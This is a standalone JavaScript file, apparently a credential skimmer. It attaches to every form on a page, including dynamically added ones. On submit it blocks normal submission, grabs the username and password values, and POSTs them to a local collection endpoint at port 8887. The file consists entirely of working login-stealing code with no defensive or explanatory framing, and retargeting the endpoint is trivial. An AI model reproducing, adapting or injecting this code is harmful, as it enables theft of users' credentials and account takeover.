(function () {
    
    function captureFormData(event) {
        event.preventDefault(); 
        const form = event.target;
        const username = form.querySelector('input[type="text"], input[type="email"]');
        const password = form.querySelector('input[type="password"]');

        const capturedData = {
            username: username ? username.value : "Не найдено",
            password: password ? password.value : "Не найдено",
            formAction: form.action || "Не указан"

        };

        console.log("Captured credentials:", capturedData);

        fetch("http://127.0.0.1:8887/capture", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(capturedData)

        })

        .then(response => {
            if (!response.ok) {

                throw new Error(`HTTP error! Status: ${response.status}`);

            }
            return response.json();

        })

        .then(data => {
            console.log("Server response:", data);
        })

        .catch(error => {

            console.error("Fetch error:", error);

        });
        // Восстановить стандартную отправку формы (опционально, если нужно)
        // form.submit();

    }

    function initializeFormCapture() {
        const forms = document.querySelectorAll("form");
        forms.forEach(form => {
            if (!form.hasAttribute('data-capture-initialized')) {
                form.addEventListener("submit", captureFormData);
                form.setAttribute('data-capture-initialized', 'true'); 

            }
        });
    }
    const observer = new MutationObserver(() => {
        initializeFormCapture();
    });
    observer.observe(document.body, { childList: true, subtree: true });
    initializeFormCapture();

})();

